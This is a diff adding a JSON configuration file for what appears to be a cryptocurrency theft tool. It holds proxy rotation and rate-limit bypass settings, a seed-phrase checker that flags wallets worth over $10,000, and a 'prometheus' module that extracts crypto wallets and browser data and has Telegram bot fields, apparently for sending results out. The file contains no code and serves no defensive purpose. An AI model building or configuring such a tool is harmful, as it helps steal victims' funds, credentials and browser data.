@@ -1,0 +1,50 @@
+{
+  "proxies": {
+    "enabled": true,
+    "rotation_mode": "round-robin",
+    "proxy_list": [],
+    "proxy_file": "proxies.txt",
+    "validation_interval_sec": 300,
+    "timeout_sec": 15,
+    "max_retries": 3,
+    "fallback_to_direct": false
+  },
+  "scanner": {
+    "threads": 20,
+    "request_timeout_sec": 30,
+    "retry_on_fail": true,
+    "max_retries": 3,
+    "delay_between_requests_ms": 100,
+    "bypass_mode": "debank_proxy"
+  },
+  "seed_checker": {
+    "seed_file": "seeds.txt",
+    "threads": 10,
+    "check_all_chains": true,
+    "highlight_threshold_usd": 10000,
+    "output_file": "seed_results.txt"
+  },
+  "rpc_endpoints": {
+    "ethereum": "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
+    "bitcoin": "https://blockstream.info/api",
+    "solana": "https://api.mainnet-beta.solana.com",
+    "bsc": "https://bsc-dataseed.binance.org",
+    "polygon": "https://polygon-rpc.com",
+    "arbitrum": "https://arb1.arbitrum.io/rpc"
+  },
+  "export": {
+    "default_format": "txt",
+    "output_directory": "./results",
+    "include_usd_value": true
+  },
+  "prometheus": {
+    "enabled": false,
+    "telegram_bot_token": "",
+    "telegram_chat_id": "",
+    "auto_extract": true,
+    "max_file_size_mb": 50,
+    "extract_crypto_wallets": true,
+    "extract_browser_data": true,
+    "output_directory": "./prometheus_results"
+  }
+}
